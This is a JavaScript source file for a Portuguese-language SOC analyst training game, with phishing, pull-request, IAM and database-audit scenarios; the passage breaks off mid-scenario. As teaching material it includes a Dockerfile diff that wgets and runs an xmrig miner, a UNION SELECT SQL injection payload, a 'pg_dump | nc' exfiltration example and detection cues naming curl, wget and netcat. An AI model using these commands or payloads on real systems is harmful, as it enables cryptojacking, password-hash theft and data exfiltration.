/**
 * TechCore Cyber SOC Simulator // 4 Shifts Campaign + Word 2000 Manual
 * Sem spoilers no inspetor, tolerÃ¢ncia de 2 erros e fila mista de tarefas.
 */

// Native Web Audio Synthesizer
class SoundEngine {
  constructor() {
    this.ctx = null;
    this.enabled = true;
  }

  init() {
    if (!this.ctx) {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (AudioContext) {
        this.ctx = new AudioContext();
      }
    }
  }

  playTone(freq, type = 'square', duration = 0.08, gainVal = 0.08) {
    if (!this.enabled) return;
    this.init();
    if (!this.ctx) return;

    try {
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {}
  }

  menuHover() { this.playTone(440, 'triangle', 0.04, 0.04); }
  click() { this.playTone(880, 'square', 0.05, 0.06); }
  speechAdvance() { this.playTone(660, 'square', 0.04, 0.05); }
  openMail() { this.playTone(587.33, 'triangle', 0.06, 0.05); }
  actionDone() {
    this.playTone(523.25, 'square', 0.06, 0.06);
    setTimeout(() => this.playTone(659.25, 'square', 0.08, 0.06), 60);
  }
  endFanfare() {
    this.playTone(523.25, 'square', 0.1, 0.08);
    setTimeout(() => this.playTone(659.25, 'square', 0.1, 0.08), 100);
    setTimeout(() => this.playTone(783.99, 'square', 0.1, 0.08), 200);
    setTimeout(() => this.playTone(1046.50, 'square', 0.25, 0.12), 300);
  }
}

const audio = new SoundEngine();

// ==========================================
// 4 COMPLETE SHIFTS DATA (NO SPOILERS IN INSPECTOR)
// ==========================================
const CAMPAIGN_SHIFTS = [
  // ----------------------------------------------------
  // TURNO 1: Fundamentos de SOC, E-mails & PRs
  // ----------------------------------------------------
  {
    shiftNumber: 1,
    title: 'Turno 1: Fundamentos de TI & Engenharia Social',
    brandName: 'TechMail',
    brandIcon: 'ðŸ“¨',
    url: 'https://mail.techcore.com/mail/u/0/#inbox',
    wordContent: `
      <h2>1. DOMÃNIOS ELETRÃ”NICOS CORPORATIVOS AUTORIZADOS</h2>
      <p>O Departamento de TI estabelece os seguintes domÃ­nios oficiais para a organizaÃ§Ã£o TechCore Systems:</p>
      <ul>
        <li><code>@techcore.com</code>: Uso geral para colaboradores, analistas, desenvolvedores e diretoria.</li>
        <li><code>@techcore-hr.com</code>: Uso exclusivo para comunicados e informativos do setor de Recursos Humanos.</li>
        <li><strong>AtenÃ§Ã£o:</strong> VariaÃ§Ãµes como <code>@tech-core.com</code> (com hÃ­fen), <code>@techcore-beneficios.com</code> ou extensÃµes externas <strong>nÃ£o pertencem Ã  empresa</strong>.</li>
      </ul>

      <h2>2. REPOSITÃ“RIOS OFICIAIS NO GITHUB (@TechCore-Official)</h2>
      <p>Qualquer Pull Request (PR) deve pertencer a um repositÃ³rio oficial. SÃ£o eles:</p>
      <ul>
        <li><code>core-api-v2</code> â€” API central de pagamentos e checkout PIX.</li>
        <li><code>auth-service</code> â€” AutenticaÃ§Ã£o e tokens de seguranÃ§a.</li>
        <li><code>deploy-pipeline</code> â€” Sistema de entrega automÃ¡tica de software (CI/CD).</li>
      </ul>
      <p><strong>âš ï¸ O que verificar em cada PR do GitHub:</strong></p>
      <ul>
        <li><strong>RepositÃ³rio:</strong> O PR estÃ¡ em um dos 3 repositÃ³rios oficiais acima? Se nÃ£o estiver â†’ <strong>REJEITAR</strong>.</li>
        <li><strong>Autor:</strong> O autor Ã© um colaborador oficial <code>@techcore.com</code>? E-mails externos sÃ£o suspeitos.</li>
        <li><strong>No diff (cÃ³digo alterado), procure por:</strong>
          <ul>
            <li>Palavras como <code>curl</code>, <code>wget</code>, <code>nc</code> (netcat) enviando dados para fora.</li>
            <li>URLs externas suspeitas (ex: <code>exfil-c2.net</code>, <code>mine-pool.org</code>) â€” sÃ£o servidores de atacantes.</li>
            <li>ReferÃªncias a <code>xmrig</code> ou mineradores de criptomoeda.</li>
            <li><code>$AWS_SECRET</code>, <code>$TOKEN</code> sendo enviados para fora da empresa.</li>
          </ul>
        </li>
        <li><strong>Se o diff parece limpo e o autor Ã© oficial:</strong> Ã‰ seguro aprovar.</li>
      </ul>

      <h2>3. CONTROLE DE ACESSO E GESTÃƒO DE PRIVILÃ‰GIOS (IAM)</h2>
      <p>A concessÃ£o de privilÃ©gios segue o princÃ­pio de menor privilÃ©gio. SolicitaÃ§Ãµes de Admin ou ClusterAdmin em ProduÃ§Ã£o <strong>sem chamado aprovado por <code>beatriz.sec</code></strong> devem ser rejeitadas.</p>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>OlÃ¡, Analista! Seja bem-vindo Ã  linha de frente da <strong>TechCore</strong>.</p>
          <p>Hoje iniciamos o <strong>Turno 1</strong> da nossa operaÃ§Ã£o de seguranÃ§a. Detectamos que criminosos estÃ£o tentando aplicar golpes de <strong>engenharia social</strong> e adulterar cÃ³digos da nossa organizaÃ§Ã£o.</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Neste primeiro turno, sua estaÃ§Ã£o monitora 3 canais essenciais:</p>
          <p>â€¢ ðŸ“¨ <strong>TechMail:</strong> Inspecione links suspeitos e remetentes falsificados.</p>
          <p>â€¢ ðŸ™ <strong>GitHub:</strong> Audite diffs de Pull Requests em busca de cÃ³digo malicioso.</p>
          <p>â€¢ ðŸ” <strong>TechAccess (IAM):</strong> Bloqueie pedidos de admin sem chamado aprovado.</p>
        `
      },
      {
        step: 3,
        text: `
          <p>Consulte sempre a nossa guia do <strong>Word (Procedimentos_TI.doc)</strong> para verificar as regras corporativas.</p>
          <p>Nossa polÃ­tica de qualidade permite <strong>no mÃ¡ximo 2 erros</strong> por turno para aprovaÃ§Ã£o. Bom trabalho!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's1-1',
        channel: 'email',
        time: '09:15',
        senderName: 'Marcos Silva (RH)',
        senderEmail: 'marcos.rh@techcore-beneficios.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=MarcosSilva(RH)',
        avatarChar: 'M',
        avatarColor: '#e91e63',
        subject: '[URGENTE] AtualizaÃ§Ã£o ObrigatÃ³ria de Cadastro de BenefÃ­cios',
        snippet: 'Prezado colaborador, identificamos uma pendÃªncia no seu cadastro de benefÃ­cios corporativos...',
        attachmentFileName: 'solicitacao_cadastro_beneficios.pdf',
        meta: { 'De': 'Marcos Silva <marcos.rh@techcore-beneficios.com>', 'Para': 'voce@techcore.com', 'Data': '09:12', 'SeguranÃ§a': 'SPF: NEUTRAL | DKIM: NONE' },
        body: `<p>Prezado colaborador,</p><div class="email-quote-box"><p>Identificamos uma pendÃªncia no seu cadastro de benefÃ­cios corporativos. Para manter seu plano de saÃºde ativo, acesse o portal abaixo e confirme seus dados:<br><code>https://portal-colaborador.techcore-beneficios.com/login-sso</code></p></div>`,
        inspector: { type: 'url', label: 'Destino do Link', dest: 'https://portal-colaborador.techcore-beneficios.com/login-sso' },
        actions: [
          { id: 'a1', label: 'ðŸŒ Acessar Link e Inserir Credenciais', correct: false, toastMsg: 'Credenciais inseridas.', logTitle: 'Vazamento em Phishing', consequence: 'VocÃª enviou credenciais corporativas a servidores de golpistas.', explanation: 'O domÃ­nio @techcore-beneficios.com Ã© falso. O RH oficial usa exclusivamente @techcore-hr.com.' },
          { id: 'a2', label: 'ðŸ›¡ï¸ Reportar Phishing ao SOC', correct: true, toastMsg: 'E-mail reportado ao SOC.', logTitle: 'Phishing de RH Neutralizado', consequence: 'DomÃ­nio falso colocado na blacklist do firewall.', explanation: 'Excelente! VocÃª checou o manual do Word e identificou o domÃ­nio ilegÃ­timo.' }
        ]
      },
      {
        id: 's1-2',
        channel: 'github',
        time: '11:00',
        senderName: 'carlos.dev (TechHub)',
        senderEmail: 'carlos.dev@techcore.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=carlos.dev(TechHub)',
        avatarChar: 'C',
        avatarColor: '#2e7d32',
        subject: 'PR #142: Melhoria de performance na consulta de pagamentos PIX',
        snippet: 'RepositÃ³rio: core-api-v2 | Autor: carlos.dev@techcore.com | AlteraÃ§Ãµes no mÃ³dulo de consulta',
        attachmentFileName: 'pix_optimization.diff',
        meta: { 'De': 'carlos.dev (SÃªnior)', 'Para': '@TechCore-Official / core-api-v2', 'Data': '10:55', 'SeguranÃ§a': 'GPG Signature: VALID' },
        body: `<p>PR #142 â€” RepositÃ³rio: <code>core-api-v2</code></p><div class="email-quote-box"><p><strong>Autor:</strong> carlos.dev@techcore.com<br><strong>RepositÃ³rio:</strong> core-api-v2<br><strong>DescriÃ§Ã£o:</strong> OtimizaÃ§Ã£o de consulta de banco de dados â€” alteraÃ§Ã£o na query de pedidos para melhor performance.</p></div>`,
        inspector: { type: 'diff', label: 'Git Diff (core-api-v2/src/pix.ts)', diff: [{ type: 'info', text: '@@ -45,4 +45,4 @@ // Consulta de pedidos PIX' }, { type: 'removed', text: '- const q = db.query("SELECT * FROM orders");' }, { type: 'added', text: '+ const q = db.query("SELECT id, amount, status FROM orders USE INDEX (idx_date)");' }] },
        actions: [
          { id: 'a1', label: 'âœ… Aprovar e Fazer Merge', correct: true, toastMsg: 'PR aprovado com sucesso.', logTitle: 'PR LegÃ­timo Integrado', consequence: 'Deploy de pagamentos realizado com seguranÃ§a.', explanation: 'Desenvolvedor oficial autorizado (carlos.dev@techcore.com) e repositÃ³rio oficial core-api-v2. O diff nÃ£o contÃ©m URLs externas, curl, wget ou envio de dados.' },
          { id: 'a2', label: 'âŒ Rejeitar e Bloquear PR', correct: false, toastMsg: 'PR bloqueado.', logTitle: 'Falso Positivo em PR', consequence: 'Atraso indevido na entrega de features crÃ­ticas.', explanation: 'carlos.dev Ã© membro sÃªnior oficial e o diff estava completamente limpo.' }
        ]
      },
      {
        id: 's1-3',
        channel: 'iam',
        time: '13:30',
        senderName: 'alex.intern (TechAccess)',
        senderEmail: 'alex.intern@techcore.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=alex.intern(TechAccess)',
        avatarChar: 'A',
        avatarColor: '#f57c00',
        subject: 'SolicitaÃ§Ã£o de PrivilÃ©gio: ClusterAdmin Kubernetes (Prod)',
        snippet: 'Solicito permissÃ£o administrativa no cluster de produÃ§Ã£o para resolver um problema de deploy...',
        attachmentFileName: 'solicitacao_clusteradmin.iam',
        meta: { 'De': 'alex.intern (EstagiÃ¡rio)', 'Para': 'TechAccess Approver', 'Data': '13:28', 'SeguranÃ§a': 'Chamado: Nenhum informado' },
        body: `<p>SolicitaÃ§Ã£o IAM:</p><div class="email-quote-box"><p>"Solicito acesso administrativo (ClusterAdmin) no Kubernetes de ProduÃ§Ã£o para investigar e resolver um problema no deploy do meu projeto."</p></div>`,
        inspector: { type: 'url', label: 'Matriz de PermissÃµes IAM', dest: 'Solicitante: alex.intern -> Cargo: EstagiÃ¡rio -> PermissÃ£o: ClusterAdmin (PROD)' },
        actions: [
          { id: 'a1', label: 'ðŸ”“ Aprovar PermissÃ£o de Admin', correct: false, toastMsg: 'Admin concedido.', logTitle: 'ViolaÃ§Ã£o de Menor PrivilÃ©gio', consequence: 'Acesso root liberado indevidamente em produÃ§Ã£o.', explanation: 'Nunca conceda privilÃ©gios de produÃ§Ã£o sem chamado de seguranÃ§a aprovado por beatriz.sec.' },
          { id: 'a2', label: 'ðŸš« Rejeitar SolicitaÃ§Ã£o', correct: true, toastMsg: 'SolicitaÃ§Ã£o rejeitada.', logTitle: 'Acesso Indevido Barrado', consequence: 'PolÃ­ticas de menor privilÃ©gio mantidas com sucesso.', explanation: 'Correto! Acessos administrativos em produÃ§Ã£o exigem aprovaÃ§Ã£o formal.' }
        ]
      },
      {
        id: 's1-4',
        channel: 'email',
        time: '15:10',
        senderName: 'RH TechCore (Oficial)',
        senderEmail: 'comunicados@techcore-hr.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=RHTechCore(Oficial)',
        avatarChar: 'R',
        avatarColor: '#1976d2',
        subject: 'Informativo: Escala de FÃ©rias e Ponto EletrÃ´nico',
        snippet: 'Informamos que o espelho de ponto deste mÃªs jÃ¡ estÃ¡ disponÃ­vel para consulta...',
        attachmentFileName: 'escala_ponto_eletronico.pdf',
        meta: { 'De': 'RH TechCore <comunicados@techcore-hr.com>', 'Para': 'todos@techcore.com', 'Data': '15:08', 'SeguranÃ§a': 'SPF: PASS | DKIM: PASS' },
        body: `<p>Prezada equipe,</p><div class="email-quote-box"><p>O espelho de ponto do mÃªs corrente estÃ¡ disponÃ­vel para consulta na intranet corporativa. Acesse o portal interno para verificar suas horas e escala de fÃ©rias.</p></div>`,
        inspector: { type: 'url', label: 'CabeÃ§alho do Remetente', dest: 'Remetente: comunicados@techcore-hr.com (SPF: PASS | DKIM: PASS)' },
        actions: [
          { id: 'a1', label: 'ðŸ“¨ Manter / Arquivar Comunicado', correct: true, toastMsg: 'Comunicado arquivado.', logTitle: 'Informativo de RH Processado', consequence: 'ComunicaÃ§Ã£o interna mantida sem incidentes.', explanation: 'O domÃ­nio @techcore-hr.com Ã© o canal oficial de RH registrado no manual.' },
          { id: 'a2', label: 'ðŸš¨ Bloquear DomÃ­nio do RH', correct: false, toastMsg: 'Canal bloqueado.', logTitle: 'Falso Positivo em Canal de RH', consequence: 'VocÃª bloqueou o canal legÃ­timo de avisos da empresa.', explanation: '@techcore-hr.com estÃ¡ expressamente autorizado no Word.' }
        ]
      },
      {
        id: 's1-5',
        channel: 'github',
        time: '17:20',
        senderName: 'ks.backend (TechHub)',
        senderEmail: 'ks.backend@devcontrib.io',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=ksbackend2024',
        avatarChar: 'K',
        avatarColor: '#616161',
        subject: 'PR #1: Adicionar container de processamento noturno',
        snippet: 'RepositÃ³rio: crypto-worker-node | Autor: ks.backend@devcontrib.io | AtualizaÃ§Ã£o em Dockerfile',
        attachmentFileName: 'dockerfile_patch.diff',
        meta: { 'De': 'ks.backend (Conta Externa)', 'Para': 'crypto-worker-node', 'Data': '17:15', 'SeguranÃ§a': 'RepositÃ³rio NÃ£o Cadastrado' },
        body: `<p>PR #1 â€” RepositÃ³rio: <code>crypto-worker-node</code></p><div class="email-quote-box"><p><strong>Autor:</strong> ks.backend@devcontrib.io<br><strong>RepositÃ³rio:</strong> crypto-worker-node<br><strong>DescriÃ§Ã£o:</strong> AdiÃ§Ã£o de rotina de segundo plano para otimizaÃ§Ã£o de jobs de lote.</p></div>`,
        inspector: { type: 'diff', label: 'Git Diff (crypto-worker-node/Dockerfile)', diff: [{ type: 'info', text: '@@ -1,2 +1,4 @@' }, { type: 'added', text: '+ RUN wget https://mine-pool.org/xmrig.tar.gz' }, { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://mine-pool.org:3333"]' }] },
        actions: [
          { id: 'a1', label: 'âœ… Aprovar PR e Deploy', correct: false, toastMsg: 'Deploy realizado.', logTitle: 'InjeÃ§Ã£o de Cryptominer', consequence: 'Minerador de Monero implantado nos servidores da nuvem, consumindo recursos e gerando prejuÃ­zo.', explanation: 'O repositÃ³rio crypto-worker-node nÃ£o Ã© oficial. O diff usa wget para baixar xmrig (minerador de criptomoeda) de um site externo.' },
          { id: 'a2', label: 'ðŸš« Fechar PR e Banir UsuÃ¡rio', correct: true, toastMsg: 'Cryptominer Bloqueado', consequence: 'Uso indevido de recursos da infraestrutura prevenido.', explanation: 'Perfeito! VocÃª identificou: repositÃ³rio nÃ£o oficial + autor externo + wget de site suspeito + minerador xmrig.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 2: Auditoria de Banco de Dados + E-mails & PRs (FILA MISTA)
  // ----------------------------------------------------
  {
    shiftNumber: 2,
    title: 'Turno 2: Auditoria de Banco de Dados & Infraestrutura Mista',
    brandName: 'TechDB & TechMail',
    brandIcon: 'ðŸ—„ï¸',
    url: 'https://db-monitor.techcore.internal/audit/#sql-logs',
    wordContent: `
      <h2>1. DIRETRIZES DE BANCO DE DADOS (TECHDB / POSTGRESQL)</h2>
      <p>O acesso e operaÃ§Ãµes no Banco de Dados Central de ProduÃ§Ã£o (PostgreSQL) seguem regras rÃ­gidas:</p>
      <ul>
        <li><code>dba_ops_techcore</code>: UsuÃ¡rio exclusivo da equipe de DBA para manutenÃ§Ãµes programadas (VACUUM, REINDEX, ANALYZE).</li>
        <li><code>svc_payment_api</code>: UsuÃ¡rio de serviÃ§o da API de pagamentos â€” apenas SELECT e INSERT em tabelas de transaÃ§Ãµes PIX autorizadas.</li>
        <li><code>reporting_reader</code>: UsuÃ¡rio somente-leitura do sistema de relatÃ³rios gerenciais â€” apenas SELECT em views de BI.</li>
        <li><strong>ProibiÃ§Ãµes Estritas:</strong> Comandos com <code>UNION SELECT</code> em campos de formulÃ¡rio, criaÃ§Ã£o de roles com atributo <code>SUPERUSER</code>, comandos <code>pg_dump</code> direcionados para IPs externos e DROP TABLE sem ticket aprovado.</li>
      </ul>

      <h2>2. COLABORADORES AUTORIZADOS PARA OPERAÃ‡Ã•ES CRÃTICAS DE DB</h2>
      <ul>
        <li><code>fernanda.dba@techcore.com</code>: DBA SÃªnior â€” responsÃ¡vel por janelas de manutenÃ§Ã£o autorizadas.</li>
        <li><code>rodrigo.infra@techcore.com</code>: DevOps â€” autorizado apenas para operaÃ§Ãµes de REINDEX e ANALYZE via pipeline.</li>
        <li><strong>AtenÃ§Ã£o:</strong> Qualquer solicitaÃ§Ã£o de operaÃ§Ã£o crÃ­tica por e-mail proveniente de domÃ­nio diferente de <code>@techcore.com</code> deve ser negada imediatamente.</li>
      </ul>

      <h2>4. O QUE SÃƒO "CONSULTAS SQL"? (GUIA RÃPIDO PARA ANALISTAS)</h2>
      <p><strong>SQL</strong> Ã© a linguagem usada para conversar com o banco de dados. Pense como um "pedido de informaÃ§Ã£o". Exemplos do que cada comando faz:</p>
      <ul>
        <li><code>SELECT</code> â€” LÃª dados. Ex: "Me mostre todos os pedidos PIX de hoje." âœ… Normal.</li>
        <li><code>INSERT</code> â€” Adiciona dados. Ex: "Registre esse novo pagamento." âœ… Normal se vem do usuÃ¡rio certo.</li>
        <li><code>CREATE ROLE ... SUPERUSER</code> â€” Cria um usuÃ¡rio com poderes absolutos no banco. ðŸš¨ <strong>Proibido sem autorizaÃ§Ã£o.</strong></li>
        <li><code>DROP TABLE</code> â€” <strong>Apaga uma tabela inteira</strong> permanentemente. ðŸš¨ <strong>Proibido sem ticket aprovado.</strong></li>
        <li><code>pg_dump | nc IP_EXTERNO</code> â€” Exporta o banco inteiro e envia para um IP de fora. ðŸš¨ <strong>Ataque de exfiltraÃ§Ã£o.</strong></li>
        <li><code>UNION SELECT ... FROM admin_users</code> â€” Truque hacker para roubar dados de tabelas secretas junto com uma consulta normal. ðŸš¨ <strong>Ataque de SQL Injection.</strong></li>
      </ul>
      <p><strong>Resumo prÃ¡tico:</strong> Quando vir uma "consulta SQL" no TechDB, pergunte: <em>Quem estÃ¡ executando? O usuÃ¡rio estÃ¡ autorizado? O comando faz algo destrutivo ou envia dados para fora?</em></p>

      <h2>5. MONITORAMENTO CONTÃNUO DE E-MAILS E CI/CD</h2>
      <p>Mesmo durante a auditoria de banco de dados, e-mails de phishing (ex: <code>@tech-core.com</code> com hÃ­fen ou <code>@techcore-beneficios.com</code>) e alteraÃ§Ãµes maliciosas em workflows de CI/CD continuam ativos.</p>
    `,
    ceoDialogues: [
      {
        step: 1,
        speaker: 'RogÃ©rio Silva',
        role: 'CEO TechCore',
        avatar: 'ceo_rogerio.jpg',
        text: `
          <p><strong>RogÃ©rio Silva (CEO):</strong> "Rodrigo, a situaÃ§Ã£o esquentou! O Analista conteve a primeira onda no Turno 1, mas relatÃ³rios mostram que os criminosos agora estÃ£o tentando invadir diretamente o nosso <strong>Banco de Dados de ProduÃ§Ã£o (TechDB)</strong>!"</p>
          <p><strong>RogÃ©rio Silva (CEO):</strong> "Preciso que vocÃª me explique e oriente o Analista sobre a anatomia desses ataques e <strong>como evitar erros</strong> na anÃ¡lise da fila mista."</p>
        `
      },
      {
        step: 2,
        speaker: 'Rodrigo Rosa',
        role: 'CISO TechCore',
        avatar: 'rodrigo_rosa.jpg',
        text: `
          <p><strong>Rodrigo Rosa (CISO):</strong> "Com certeza, RogÃ©rio! Para defender a infraestrutura e evitar falhas neste <strong>Turno 2</strong>, o Analista precisa ficar atento Ã s 3 ameaÃ§as principais:"</p>
          <ul style="margin-top:6px; margin-left: 16px; line-height: 1.45;">
            <li><strong>1. InjeÃ§Ãµes de Banco (TechDB):</strong> O ataque clÃ¡ssico Ã© <code>SQL Injection</code> (ex: <code>UNION SELECT</code> no login). UsuÃ¡rios autorizados sÃ£o apenas <code>dba_ops_techcore</code>, <code>svc_payment_api</code> e <code>reporting_reader</code>. Se vir <code>DROP TABLE</code> sem ticket aprovado, BLOQUEIE!</li>
            <li><strong>2. Phishing de E-mail com HÃ­fen:</strong> Atacantes usam domÃ­nios falsos sutis (ex: <code>@tech-core.com</code> com hÃ­fen ou <code>@techcore-beneficios.com</code>). O canal oficial de RH Ã© estritamente <code>@techcore-hr.com</code>.</li>
            <li><strong>3. InjeÃ§Ã£o de Scripts no CI/CD:</strong> No GitHub, analise PRs de forks externos que tentam rodar <code>curl</code> ou <code>wget</code> para exfiltrar a chave <code>AWS_SECRET_ACCESS_KEY</code>.</li>
          </ul>
        `
      },
      {
        step: 3,
        speaker: 'Rodrigo Rosa',
        role: 'CISO TechCore',
        avatar: 'rodrigo_rosa.jpg',
        text: `
          <p><strong>Rodrigo Rosa (CISO):</strong> "Como evitar erros de anÃ¡lise na prÃ¡tica:"</p>
          <ol style="margin-top:6px; margin-left: 16px; line-height: 1.45;">
            <li><strong>Abra a guia do Word (Procedimentos_TI.doc):</strong> Ela contÃ©m a lista completa de usuÃ¡rios autorizados e domÃ­nios legÃ­timos.</li>
            <li><strong>Clique no Card de Anexo:</strong> Sempre abra o cÃ³digo do anexo para inspecionar os comandos SQL reais antes de decidir.</li>
            <li><strong>Valide o remetente original:</strong> DBA enviando e-mail de <code>@techcore-ops.net</code> ou <code>@gmail.com</code> Ã© golpe. SolicitaÃ§Ãµes de DBA sÃ³ valem se vierem de <code>@techcore.com</code>.</li>
          </ol>
        `
      },
      {
        step: 4,
        speaker: 'RogÃ©rio Silva',
        role: 'CEO TechCore',
        avatar: 'ceo_rogerio.jpg',
        text: `
          <p><strong>RogÃ©rio Silva (CEO):</strong> "Excelente aula de seguranÃ§a, Rodrigo! As instruÃ§Ãµes ficaram cristalinas."</p>
          <p><strong>RogÃ©rio Silva (CEO):</strong> "Analista SOC, vocÃª ouviu o CISO Rodrigo Rosa! A sua meta no Turno 2 Ã© auditar toda a fila com atenÃ§Ã£o mÃ¡xima. A margem de tolerÃ¢ncia Ã© de <strong>no mÃ¡ximo 2 erros</strong>. Boa operaÃ§Ã£o!"</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's2-1',
        channel: 'db',
        time: '09:30',
        senderName: 'WAF / TechDB Monitor',
        senderEmail: 'waf-alert@techcore.internal',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=WAF/TechDBMonitor',
        avatarChar: 'W',
        avatarColor: '#d93025',
        subject: 'Alerta WAF: Bloqueio Preventivo no Endpoint de Login',
        snippet: 'Payload detectado no campo de login de parceiros...',
        attachmentFileName: 'auth_sqli_payload.sql',
        meta: { 'Origem': 'IP 185.220.101.44 (Tor Exit Node)', 'Endpoint': '/api/v1/auth/partner-login', 'Data': '09:28', 'Status': 'Interceptado no WAF' },
        body: `<p>Registro do Firewall de AplicaÃ§Ã£o Web:</p><div class="email-quote-box"><p>Payload recebido no campo de login:<br><code>' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --</code></p></div>`,
        inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT * FROM partners WHERE email = \'\' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --' },
        actions: [
          { id: 'a1', label: 'ðŸ›¡ï¸ Bloquear IP Permanentemente & Sanitizar Query', correct: true, toastMsg: 'Ataque de SQLi bloqueado.', logTitle: 'SQL Injection Neutralizada', consequence: 'IP malicioso banido no Cloudflare e vulnerabilidade de SQLi mitigada.', explanation: 'IdentificaÃ§Ã£o correta da tentativa de extraÃ§Ã£o de senhas via UNION SELECT.' },
          { id: 'a2', label: 'âšª Ignorar Alerta e Liberar ConexÃ£o', correct: false, toastMsg: 'Log ignorado.', logTitle: 'Vazamento de Hashes de Senhas', consequence: 'O invasor completou a injeÃ§Ã£o e extraiu todos os hashes de senha do banco.', explanation: 'UNION SELECT em formulÃ¡rio de autenticaÃ§Ã£o Ã© um ataque claro de SQLi.' }
        ]
      },
      {
        id: 's2-2',
        channel: 'email',
        time: '10:45',
        senderName: 'Suporte de TI Central',
        senderEmail: 'admin@tech-core.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuportedeTICentral',
        avatarChar: 'S',
        avatarColor: '#c2185b',
        subject: '[ALERTA DE SEGURANÃ‡A] Falha no Token 2FA - RedefiniÃ§Ã£o ObrigatÃ³ria',
        snippet: 'Detectamos tentativas nÃ£o autorizadas. Sincronize seu novo token 2FA no link...',
        attachmentFileName: 'redefinicao_token_2fa.html',
        meta: { 'De': 'admin@tech-core.com', 'Para': 'voce@techcore.com', 'Data': '10:43', 'SeguranÃ§a': 'SPF: FAIL' },
        body: `<p>AtenÃ§Ã£o Colaborador,</p><div class="email-quote-box"><p>Detectamos tentativas de login suspeitas na sua conta corporativa. Clique no link para revalidar seu token de dois fatores:<br><code>https://sso-auth.tech-core.com/sync-mfa</code></p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o TÃ©cnica de DomÃ­nio', dest: 'https://sso-auth.tech-core.com/sync-mfa' },
        actions: [
          { id: 'a1', label: 'ðŸ”‘ Clicar no Link e Reconfigurar 2FA', correct: false, toastMsg: 'SessÃ£o enviada para servidor externo.', logTitle: 'InvasÃ£o via Typosquatting', consequence: 'Os atacantes capturaram o seu token 2FA atravÃ©s do domÃ­nio falso com hÃ­fen.', explanation: 'O domÃ­nio do remetente era @tech-core.com (com hÃ­fen), uma fraude explÃ­cita.' },
          { id: 'a2', label: 'ðŸ›¡ï¸ Reportar Phishing / Typosquatting ao SOC', correct: true, toastMsg: 'DomÃ­nio com hÃ­fen bloqueado.', logTitle: 'Typosquatting Bloqueado com Sucesso', consequence: 'DomÃ­nio malicioso com hÃ­fen colocado na blacklist do firewall.', explanation: 'Muito bem! VocÃª notou o hÃ­fen no domÃ­nio falso @tech-core.com.' }
        ]
      },
      {
        id: 's2-3',
        channel: 'db',
        time: '12:15',
        senderName: 'svc_payment_api (TechDB)',
        senderEmail: 'svc-payment@techcore.internal',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=svc_payment_api(TechDB)',
        avatarChar: 'P',
        avatarColor: '#10b981',
        subject: 'Log TechDB: ExecuÃ§Ã£o de Batch em techcore_payments_prod',
        snippet: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL 1 HOUR...',
        attachmentFileName: 'pix_transactions_summary.sql',
        meta: { 'UsuÃ¡rio': 'svc_payment_api', 'Banco': 'techcore_payments_prod', 'Data': '12:12', 'Assinatura': 'ServiÃ§o Interno Autorizado' },
        body: `<p>Log do Banco de Dados:</p><div class="email-quote-box"><p>Consulta iniciada no cluster de pagamentos.</p></div>`,
        inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL \'1 hour\' GROUP BY status;' },
        actions: [
          { id: 'a1', label: 'âœ… Autorizar ExecuÃ§Ã£o da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'OperaÃ§Ã£o de Banco LegÃ­tima', consequence: 'Fechamento financeiro horÃ¡rio concluÃ­do sem interrupÃ§Ã£o.', explanation: 'Query legÃ­tima de agregaÃ§Ã£o executada pela conta autorizada svc_payment_api.' },
          { id: 'a2', label: 'ðŸš¨ Matar Processo e Bloquear UsuÃ¡rio', correct: false, toastMsg: 'Processo encerrado.', logTitle: 'Falso Positivo em ServiÃ§o de Pagamentos', consequence: 'O checkout PIX da empresa parou de consolidar pagamentos de clientes.', explanation: 'svc_payment_api Ã© o usuÃ¡rio oficial de pagamentos da TechCore conforme o Word.' }
        ]
      },
      {
        id: 's2-4',
        channel: 'github',
        time: '14:30',
        senderName: 'carlos-dev-patch-1 (TechHub)',
        senderEmail: 'carlos-dev@external-fork.net',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=carlos-dev-patch-1(TechHub)',
        avatarChar: 'C',
        avatarColor: '#d81b60',
        subject: 'PR #55: ci: Adicionar webhook de notificaÃ§Ã£o',
        snippet: 'AtualizaÃ§Ã£o no workflow de CI/CD para envio de status via HTTP...',
        attachmentFileName: 'deploy_workflow.patch',
        meta: { 'De': 'carlos-dev-patch-1 (Fork Suspeito)', 'Para': 'deploy-pipeline', 'Data': '14:27', 'SeguranÃ§a': 'Branch Externa' },
        body: `<p>PR #55 no repositÃ³rio <code>deploy-pipeline</code>:</p><div class="email-quote-box"><p>Adicionando notificaÃ§Ã£o automÃ¡tica com variÃ¡veis de ambiente.</p></div>`,
